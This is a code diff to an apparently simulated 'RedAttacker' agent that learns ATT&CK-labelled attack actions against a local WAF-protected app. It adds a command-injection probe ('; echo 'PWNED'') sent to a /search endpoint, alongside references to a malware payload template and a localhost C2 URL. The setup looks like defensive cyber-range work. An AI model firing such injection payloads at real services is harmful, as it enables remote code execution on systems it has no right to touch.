@@ -31,11 +31,12 @@ TARGET_DIR = "/tmp"
 PORTS_DIR = "/tmp/ports"
 PAYLOAD_TEMPLATE = os.path.join(BASE_DIR, "payloads", "malware.py")
 C2_URL = "http://127.0.0.1:8888"
+TARGET_URL = "http://127.0.0.1:9000" # WAF Proxy
 
 # --- HYPERPARAMETERS ---
 # Increased weight of Ransomware and Masquerade in the action set via logic tweaks if needed,
 # but simply having them available is enough for Q-learning to pick them up if they yield rewards.
-ACTIONS = ["T1046_RECON", "T1027_OBFUSCATE", "T1204_USER_EXECUTION", "T1589_LURK", "T1036_MASQUERADE", "T1486_ENCRYPT", "T1048_EXFILTRATION", "T1020_EXFIL_PASTE"]
+ACTIONS = ["T1046_RECON", "T1190_EXPLOIT_PUBLIC_FACING", "T1204_USER_EXECUTION", "T1589_LURK", "T1036_MASQUERADE", "T1486_ENCRYPT", "T1048_EXFILTRATION", "T1020_EXFIL_PASTE"]
 ALPHA = 0.4
 ALPHA_DECAY = 0.9999
 GAMMA = 0.9
@@ -126,12 +127,27 @@ class RedAttacker:
                 impact = 0
 
                 if action == "T1046_RECON":
-                    fname = os.path.join(TARGET_DIR, f"malware_bait_{uuid.uuid4()}.sh")
+                    # Network Scan via WAF
                     try:
-                        fd = os.open(fname, os.O_WRONLY | os.O_CREAT | os.O_EXCL, 0o600)
-                        with os.fdopen(fd, 'w') as f: f.write("echo 'scan'")
-                        impact = 1
-                    except OSError: pass
+                        with urllib.request.urlopen(f"{TARGET_URL}/health", timeout=1) as resp:
+                            if resp.status == 200: impact = 1
+                    except: pass
+
+                elif action == "T1190_EXPLOIT_PUBLIC_FACING":
+                    # Attempt RCE against Yellow App via WAF
+                    try:
+                        # Try bypass? No, direct hit first.
+                        payload = urllib.parse.quote("; echo 'PWNED'")
+                        url = f"{TARGET_URL}/search?q={payload}"
+                        with urllib.request.urlopen(url, timeout=1) as resp:
+                            body = resp.read().decode()
+                            if "PWNED" in body:
+                                self.logger.info("RCE Successful!")
+                                impact = 10
+                            elif "WAF BLOCK" in body:
+                                self.logger.warning("Blocked by WAF!")
+                                impact = -2
+                    except Exception as e: pass
 
                 elif action == "T1027_OBFUSCATE":
                     fname = os.path.join(TARGET_DIR, f"malware_crypt_{uuid.uuid4()}.bin")
